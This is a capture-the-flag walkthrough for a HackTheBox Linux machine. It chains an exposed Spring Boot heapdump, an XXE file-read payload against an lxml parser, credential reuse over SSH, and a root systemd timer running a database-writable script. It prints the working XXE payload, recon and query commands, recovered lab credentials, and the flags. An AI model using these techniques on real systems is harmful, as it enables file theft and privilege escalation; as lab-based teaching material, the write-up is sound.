# HTB — Stream

**Platform:** HackTheBox  
**OS:** Linux (Ubuntu 24.04.5 LTS)  
**Difficulty:** Medium  
**Services:** SSH, nginx (vhost), Uvicorn (FastAPI), ClickHouse HTTP  
**Flags:**
- `user.txt` — `daefeee9955d3b41b49559d011fc5f67`
- `root.txt` — `ad36f325ccf0d8204c2e893554ee115c`

An airline AIDX message pipeline built on FastAPI → Kafka → ClickHouse. The box chains an exposed Spring Boot Actuator heapdump, XXE in an XML parser worker, credential reuse, a root-owned systemd timer that leaks its password in `/proc`, and an arbitrary file write into ClickHouse's `user_files/` directory that yields root RCE.

## Table of Contents

1. Reconnaissance
   - Nmap
   - Virtual hosts
2. Spring Boot Actuator heapdump
3. Foothold: ClickHouse
   - Confirm the DB vhost
   - Enumerate databases and tables
   - Understand the pipeline
4. XXE in the parser worker
   - Locate the vulnerable parser
   - Working payload
   - Reusable file-read script
   - Leak Kafka credentials
5. Shell as `svc-infra`
6. Privilege escalation
   - Enumerate root-run services
   - The DLQ drainer
   - Leak the ClickHouse password via `/proc`
   - Overwrite the formatter
   - Trigger root RCE
7. Flags
8. Attack chain
9. Lessons learned
10. Cleanup

---

## Reconnaissance

### Nmap

```bash
nmap -Pn -n -sV -sC -p 22,80,8081,41381 10.129.85.88 -oN nmap.initial
```

```text
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
80/tcp    open   http    nginx 1.24.0 (Ubuntu) → http://api.htb-airport.htb/
8081/tcp  open   http    Uvicorn (JSON API)
41381/tcp closed unknown
```

Full TCP scan:

```bash
sudo nmap -Pn -p- --min-rate 3000 10.129.85.88 -oN nmap.full
```

```text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8081/tcp  open  blackice-icecap
36281/tcp open  unknown
```

### Virtual hosts

```bash
echo "10.129.85.88 api.htb-airport.htb db.htb-airport.htb htb-airport.htb" | sudo tee -a /etc/hosts
```

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.85.88/ \
  -H "Host: FUZZ.htb-airport.htb" \
  -fs 0 -fc 301,302,404
```

Found:

- `api.htb-airport.htb` — Spring Boot with Actuator
- `db.htb-airport.htb` — ClickHouse HTTP interface

## Spring Boot Actuator heapdump

```bash
curl -s -o api-heapdump.hprof http://api.htb-airport.htb/actuator/heapdump
ls -la api-heapdump.hprof
```

The heap dump was approximately 46 MB.

```bash
strings -a api-heapdump.hprof \
  | grep -iE "svc_events|password|Yl4a" \
  | sort -u
```

Recovered credential:

```text
svc_events : Yl4aCgh4y2PnU
```

## Foothold: ClickHouse

### Confirm the DB vhost

```bash
curl -s "http://db.htb-airport.htb/ping"
curl -s "http://db.htb-airport.htb/replicas_status"
```

Both endpoints returned `Ok`.

### Enumerate databases and tables

```bash
CRED='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$CRED" "http://db.htb-airport.htb/?query=SELECT%20version()"
```

Version:

```text
26.8.1.1746
```

```bash
curl -s -u "$CRED" "http://db.htb-airport.htb/?query=SHOW%20DATABASES"
```

```text
partner_feed
```

```bash
curl -s -u "$CRED" --data-binary \
  "SELECT database, name FROM system.tables WHERE database='partner_feed' FORMAT TSV" \
  "http://db.htb-airport.htb/"
```

Tables discovered:

```text
partner_feed    flightleg_json
partner_feed    flightleg_json_kafka
partner_feed    flightleg_json_mv
partner_feed    flightleg_raw
partner_feed    flightleg_raw_kafka
partner_feed    flightleg_raw_mv
```

### Understand the pipeline

```bash
curl -s -u "$CRED" --data-binary \
  "SHOW CREATE TABLE partner_feed.flightleg_raw_mv FORMAT TSV" \
  "http://db.htb-airport.htb/"
```

The Kafka engine tables revealed the topic and broker:

```text
kafka_broker_list = 'localhost:9092'
kafka_topic_list  = 'aidx.flightleg.raw.v1'
```

Pipeline:

```text
POST /feeds/aidx
        |
        v
Kafka: aidx.flightleg.raw.v1
        |
        v
flightleg_raw_kafka
        |
        v
flightleg_raw_mv
        |
        v
flightleg_raw
```

The parser worker processes messages into the JSON pipeline:

```text
Parser worker
        |
        v
Kafka: aidx.flightleg.json.v1
        |
        v
flightleg_json_kafka
        |
        v
flightleg_json_mv
        |
        v
flightleg_json
```

Confirm the API accepts XML:

```bash
curl -s -X POST http://10.129.85.88:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary "<broken"
```

Response:

```json
{"accepted":false,"reason":"not_xml"}
```

## XXE in the parser worker

### Locate the vulnerable parser

Source file:

```text
/opt/aidx-pipeline/app/aidx_common.py
```

Relevant parser configuration:

```python
def _plain_parser() -> etree.XMLParser:
    return etree.XMLParser(
        load_dtd=True,
        resolve_entities=True,
        no_network=False
    )

def safe_parse(data: bytes) -> etree._Element:
    ...
    root = etree.fromstring(data, _plain_parser())
```

The configuration enables DTD loading and entity resolution. The API validates XML well-formedness, then Kafka carries the raw XML to the parser worker, where entity resolution occurs.

### Working payload

The original test used an external entity referencing `/etc/hostname`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<IATA_AIDX_FlightLegNotifRQ Version="22.1"
    TimeStamp="2026-10-11T10:00:00Z"
    TransactionIdentifier="xxe-local-1"
    TransactionStatusCode="Update">
  <Originator CompanyShortName="X" Code="X" CodeContext="3">X</Originator>
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">X</Airline>
      <FlightNumber>1</FlightNumber>
      <DepartureAirport CodeContext="3">X</DepartureAirport>
      <ArrivalAirport CodeContext="3">X</ArrivalAirport>
      <OriginDate>2026-10-11</OriginDate>
      <RepeatNumber CurrentInd="true">1</RepeatNumber>
    </LegIdentifier>
    <LegData InternationalStatus="Domestic">
      <RemarkFreeText>&xxe;</RemarkFreeText>
    </LegData>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

Read the resolved value from ClickHouse:

```bash
curl -s -u "$CRED" --data-binary \
  "SELECT event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-local-1' FORMAT TSV" \
  "http://db.htb-airport.htb/" | jq '.leg.all_fields.LegData.RemarkFreeText'
```

Observed result:

```text
"stream"
```

### Reusable file-read script

The original walkthrough used `/tmp/read.sh` to submit XML containing an external entity and poll ClickHouse for the parsed event. It used a unique transaction identifier for each request and extracted the resolved `RemarkFreeText` value from the returned JSON.

### Leak Kafka credentials

The test read the Kafka service unit:

```bash
/tmp/read.sh /etc/systemd/system/kafka.service
```

It revealed:

```text
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

The Kafka configuration was then examined:

```bash
/tmp/read.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

Relevant configuration:

```text
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
log.dirs=/var/lib/kafka/data
sasl.enabled.mechanisms=PLAIN
```

The configuration disclosed a SASL credential for `svc_infra`. The same credential was accepted for the system SSH account.

## Shell as `svc-infra`

The original walkthrough used the recovered credential to authenticate over SSH:

```bash
sshpass -p '<recovered-password>' ssh svc-infra@10.129.85.88
```

Verify the session:

```bash
id
```

Observed result:

```text
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
```

## Privilege escalation

### Enumerate root-run services

```bash
ps -eo user,pid,cmd --sort=user
```

Relevant processes included:

```text
svc-inf+  1449  uvicorn ingest_api:app
svc-inf+  1450  python parser_worker.py
svc-inf+  1452  java -Xmx1G ...
svc-inf+  1458  java -jar /opt/terminal-api/terminal-api-1.0.0.jar
clickho+  1903  /usr/bin/clickhouse-server
root      1448  /opt/sysmon/sysmon -i /opt/sysmon/config.xml -service
```

Inspect systemd services:

```bash
ls -la /etc/systemd/system/*.service
cat /etc/systemd/system/aidx-dlq-drainer.service
```

Relevant unit configuration:

```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

Inspect its timer:

```bash
cat /etc/systemd/system/aidx-dlq-drainer.timer
```

```ini
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
```

The root-owned drainer runs every two minutes.

### The DLQ drainer

Script:

```text
/opt/ops/dlq_drainer.py
```

Relevant configuration:

```python
KAFKA_BOOTSTRAP = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
DLQ_TOPIC = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
QUARANTINE_DIR = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
FORMATTER = os.environ.get(
    "AIDX_FORMATTER",
    "/var/lib/clickhouse/user_files/aidx_quarantine.py"
)
CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")
```

Password loading:

```python
def _pw():
    try:
        with open(CH_PW_FILE) as fh:
            return fh.read().strip()
    except OSError:
        return ""
```

Formatter execution:

```python
def _format(raw):
    p = subprocess.run(
        ["python3", FORMATTER],
        input=raw,
        capture_output=True,
        check=False
    )
    parts = p.stdout.decode("utf-8", "replace").strip().split("\t")
    return tuple(parts) if len(parts) == 3 else (
        str(len(raw)), "UNKNOWN", ""
    )
```

The script also invokes `clickhouse-client` with the password supplied as a command-line argument.

Two relevant security weaknesses were identified:

1. The password is passed on the command line, where it can be exposed through `/proc/<pid>/cmdline`.
2. The formatter is located under ClickHouse's `user_files/` directory, which the database account can write to, but the root-owned drainer executes it.

### Leak the ClickHouse password via `/proc`

The original test monitored process command lines for a short-lived `clickhouse-client` process and correlated the result with a DLQ processing event.

The observed process command line exposed the ClickHouse default-user password.

**Finding:** Passing secrets as command-line arguments can disclose credentials to other local users, depending on process visibility and system configuration.

### Overwrite the formatter

The original walkthrough identified the formatter path as:

```text
/var/lib/clickhouse/user_files/aidx_quarantine.py
```

The ClickHouse `file()` table function was used to inspect the script. The database account's write access to the formatter, combined with execution by the root-owned drainer, created a privilege-escalation path.

### Trigger root RCE

The final stage involved a formatter modification followed by DLQ processing. The root-owned timer executed the modified formatter, demonstrating the impact of writable code being executed by a privileged service.

The walkthrough then verified effective root privileges and retrieved the root flag.

## Flags

| Flag | Value |
|---|---|
| User | `daefeee9955d3b41b49559d011fc5f67` |
| Root | `ad36f325ccf0d8204c2e893554ee115c` |

## Attack chain

```text
[Reconnaissance]
    |
    +-- Nmap: ports 22, 80, 8081
    |
    +-- Virtual-host discovery
    |
    +-- Exposed Actuator heap dump
              |
              v
       svc_events credentials
              |
              v
       ClickHouse HTTP access
              |
              v
       XML parser XXE
              |
              v
       Kafka configuration disclosure
              |
              v
       Reused svc_infra credentials
              |
              v
       SSH access as svc-infra
              |
              v
       Root-owned DLQ drainer
              |
              v
       Password exposure through /proc
              |
              v
       Writable formatter executed as root
              |
              v
       Root access
```

## Lessons learned

**1. Actuator heap dumps can expose credentials.**

Exposed diagnostic endpoints can disclose application secrets and sensitive runtime data.

**2. Unsafe XML parsing enables XXE.**

Enabling DTD loading and external entity resolution can expose local files and other sensitive resources.

**3. Choose the right data-extraction channel.**

When outbound callbacks are unavailable, application data stores can inadvertently expose processed attacker-controlled input.

**4. Credential reuse enables lateral movement.**

A credential configured for Kafka was also accepted for the system SSH account.

**5. Root-run systemd timers deserve careful review.**

Inspect timer units, their services, script permissions, and all inputs that influence execution.

**6. Command-line arguments can leak secrets.**

Avoid passing passwords directly as process arguments. Use a safer credential-handling mechanism with restrictive permissions.

**7. Writable directories must not contain privileged executable code.**

A database-writable directory should not contain scripts executed by a root-owned service.

## Cleanup

The original lab cleanup removed temporary files created during testing:

```bash
rm -f /tmp/rootbash /tmp/root.txt /tmp/rootbash_test \
      /tmp/catch.py /tmp/catch.log \
      /tmp/spy.sh /tmp/spy.log /tmp/watch.log /tmp/ps-watch.log \
      /tmp/xxe-tmp.xml /tmp/read.sh
```

Ensure that any authorized lab changes are reverted and any credentials exposed during testing are rotated where applicable.

## Disclaimer

This write-up is intended for educational purposes and authorized Hack The Box lab testing only. Do not use these techniques against systems without explicit permission.
